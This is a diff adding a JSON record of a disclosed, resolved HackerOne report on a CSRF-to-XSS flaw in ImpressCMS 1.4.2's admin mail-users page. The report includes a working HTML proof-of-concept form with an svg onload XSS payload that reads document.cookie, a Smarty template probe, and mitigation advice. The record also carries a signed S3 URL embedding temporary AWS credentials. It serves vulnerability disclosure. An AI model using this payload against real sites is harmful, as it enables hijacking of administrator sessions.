@@ -1,0 +1,197 @@
+{
+  "id": 1096123,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk2MTIz",
+  "url": "https://hackerone.com/reports/1096123",
+  "title": "CSRF to XSS in /htdocs/modules/system/admin.php",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-02-05T12:56:32.575Z",
+  "submitted_at": "2021-02-05T12:56:32.690Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3addog",
+    "url": "/d3addog",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6eYT7pNzVhruckM1E1V5w8K1/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 38302,
+    "url": "https://hackerone.com/impresscms",
+    "handle": "impresscms",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/302/c9f69b5546e2b4211c0a26681a398b1685cc5ebb_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/302/c9f69b5546e2b4211c0a26681a398b1685cc5ebb_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "ImpressCMS",
+      "twitter_handle": "impresscms",
+      "website": "https://www.impresscms.org",
+      "about": "PHP and MySQL Open source content management system for multiple languages"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-10-14T18:47:43.005Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-10-10T09:52:55.108Z",
+  "team_member_agreed_on_going_public_at": "2023-10-14T18:47:42.885Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nThe ```memberslist_id``` and ```memberlist_uname[]``` POST parameters in the scenario \"/htdocs/modules/system/admin.php\" are affected by XSS due to lack of user supplied data filtration. Due to lack of CSRF token verification it is possible for attacker to craft special web page, which will perform request to the vulnerable ImpressCMS application on authorised user behalf, upon visiting it. \n\n## ImpressCMS branch :\n\nImpress CMS version: 1.4.2\nPHP Version: 7.2.24\n\n## Browsers Verified In:\n\nFirefox 85.0\n\n## Steps To Reproduce:\n\n  1) Host a web server with the following page (note that url in form action should be modified with your testing address)\n\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://<YOUR IMPRESS CMS HOST>/htdocs/modules/system/admin.php?fct=mailusers\" method=\"POST\">\n        <input type=\"hidden\" name=\"mail&#95;to&#95;group&#91;&#93;\" value=\"2\" />\n      <input type=\"hidden\" name=\"mail&#95;lastlog&#95;min\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;lastlog&#95;max\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;idle&#95;more\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;idle&#95;less\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;regd&#95;min\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;regd&#95;max\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;fromname\" value=\"ImpressCMS\" />\n      <input type=\"hidden\" name=\"mail&#95;fromemail\" value=\"impress&#64;notexist&#46;notexist\" />\n      <input type=\"hidden\" name=\"mail&#95;subject\" value=\"\" />\n      <input type=\"hidden\" name=\"mail&#95;body\" value=\"&#123;&#36;smarty&#46;version&#125;\" />\n      <input type=\"hidden\" name=\"mail&#95;send&#95;to&#91;&#93;\" value=\"mail\" />\n      <input type=\"hidden\" name=\"mail&#95;submit\" value=\"Send\" />\n      <input type=\"hidden\" name=\"op\" value=\"send\" />\n      <input type=\"hidden\" name=\"mail&#95;start\" value=\"0\" />\n      <input type=\"hidden\" name=\"memberslist&#95;id&#91;&#93;\" value=\"asdf&apos;&gt;&lt;&#47;a&gt;&lt;svg&#47;onload&#61;alert&#40;document.cookie&#41;&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\n```\n  2)  Login to your ImpressCMS application with privileged account\n  3) In the same browser open web page from step 1 and click \"Submit request\"\n  4) See the XSS payload fired \n\n## Suggestions to mitigate or resolve the issue:\nProperly sanitise  user input using built-in ```StopXSS``` function. Properly check CSRF token\n\n## Credits\nThis bug was found as a part of Solar Security CMS Reseach, with https://hackerone.com/d0bby, https://hackerone.com/wezery0, https://hackerone.com/silvereniqma in collaboration. Can you, please, add them to this report?\n\n## Impact\n\nCSRF leading to XSS",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1184973,
+      "file_name": "xss_csrf_impress.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jb4s9b4gd35a2pde2qvvgm7856gf?response-content-disposition=attachment%3B%20filename%3D%22xss_csrf_impress.png%22%3B%20filename%2A%3DUTF-8%27%27xss_csrf_impress.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ26TPEBDB%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T044922Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJIMEYCIQCox93aj484Dun%2BiHUzEzur35hePizlyTPCWuCcejJl5AIhAM33Oy29mcn4go3WxFVgySURFUwoS6Ctas4AnUxEuIK8KrIFCAYQAxoMMDEzNjE5Mjc0ODQ5IgzV6haXsUbmrr4UCbgqjwVnyH7eXnVvcekdVhgledPvVchvZeW2%2FZv3yRw7QKwoE4zsq31VBV4q7eeCAEcoj1Qc3yzaMc6UxViTioxPJTeDZp9RZ4625dNo3vlBFAEsgFQtgZIwF0tXFS8PESNIIlp9EcGY4z9jZOgQiV4JCRXjMLDiIf9%2FdrdnzJ%2B1QiNyKFaWrgdJ1Ha4X5dFaRjSMEeyKuhgDUB%2F%2BEDSAnloC%2B9De1GXPOH7m%2B2kARBHlbpPYOm2GUZJVRT8RkUAFUKHmjYgioZSPJ1X3K1WzyPFXc5E1c126xkSmhPA2mSuwp1UPB4T94HUi0c7chwI56eyiU6Un1jARZjx03MnpBgdLd4cvF5owhxA3J%2Fr0B90wNvVJvfVvQoXSjd%2FoPJMhM79xtbdZ7HP9KdxhnKZzDIkOoETAC31StgGiP%2Bg9dDGXrL2PMnstROIdIc7Og%2FowsXdEUqghhe%2By5BDn%2B9Kn4mWpfm0jEGCNfQ383ELF9UhYcDGJ9y4RUNk%2F7wfcr4TqjE10r%2Fym8dHHDNFSpIPuWfgm1g86QrilLhcUgmMbfbIk7dcOe7OcgAL4pQiQb1SQgyty67NTRat3hIw9FV%2Bx1OaR0gObi78Dn9W3O%2BNHpsYvhUnVSpD3Ny%2FiAhcF5zi0RU9XjpC5bXbU7B2b5xkL21DpTcAH6JMZdRaubUwXccCjrtDzWbCz9xsm%2BspDsIZIkggB9WCtBySFJ01YjYJ87Uv3rnJvwzwwudhVsYR5X4XozHqsowXKxOM6f1zg2LohL20Y4iji%2FQgdPb6UdlvQ7yGsIXvPO6WvnF1DAB%2FUE7cdZ7GiWjatK4N4v6rAguv58am86qVy7J%2FVGiPRiTye1IfYsOo5Ubnnk6pKhyfJllClYpXMInynNIGOrABbuRSbaQG7WTwO7YB82Qk8yf3kI92C3a%2FIZ0ALjdQ7VBDWqq%2Foy9jqMTx%2BZXvCExde0XRgJXnuV5mqQHwatLOmyUJ7yGYlnafC02N5rdUrqjZi%2FW0oa4MDsoSOn70n883ec940nKaYqwB3SSRh%2F%2FfiD1Lbzk8eS3eMsC8dSSdbHvuWy05HFJFvuzcxCADbpP70yBmqH1Y7vWnw7xkX9QpN2wm9KLeKy22VCq8YYZ459k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2b9a5860277243b745cc29ec4482f85e759d5189bc65beec2345bccfb63508cf",
+      "file_size": 110898,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-11-09T09:52:55.253Z",
+  "allow_singular_disclosure_after": -83530587.25354509,
+  "singular_disclosure_allowed": true,
+  "vote_count": 26,
+  "voters": [
+    "loaymorad",
+    "rachid_aym",
+    "defenderwww",
+    "m4khn0",
+    "kanazawaaaa",
+    "zy9ard3",
+    "bl4de",
+    "shreyaschavhan",
+    "shubham_srt",
+    "noobstain",
+    "and 16 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 28943,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/impresscms/impresscms",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1096123",
+  "votes": 26,
+  "latest_disclosable_activity_at": "2023-10-14T18:47:43.083Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:49:22.629333",
+    "source": "https://hackerone.com/reports/1096123.json",
+    "report_id": 1096123
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk2MTIz",
+    "databaseId": "1096123",
+    "title": "CSRF to XSS in /htdocs/modules/system/admin.php",
+    "url": "https://hackerone.com/reports/1096123",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2023-10-14T18:47:43.005Z",
+    "created_at": "2021-02-05T12:56:32.575Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzQ1",
+      "name": "Cross-Site Request Forgery (CSRF)",
+      "external_id": "cwe-352"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "d3addog"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMzgzMDI=",
+      "handle": "impresscms",
+      "name": "ImpressCMS",
+      "url": "https://hackerone.com/impresscms",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzEwOTYxMjM=",
+    "_id": "1096123",
+    "disclosed": true,
+    "votes": 26,
+    "latest_disclosable_activity_at": "2023-10-14T18:47:43.083Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk2MTIz",
+      "databaseId": "1096123",
+      "title": "CSRF to XSS in /htdocs/modules/system/admin.php",
+      "url": "https://hackerone.com/reports/1096123",
+      "disclosed_at": "2023-10-14T18:47:43.005Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMzgzMDI=",
+      "handle": "impresscms",
+      "name": "ImpressCMS",
+      "url": "https://hackerone.com/impresscms",
+      "currency": "usd"
+    }
+  }
+}
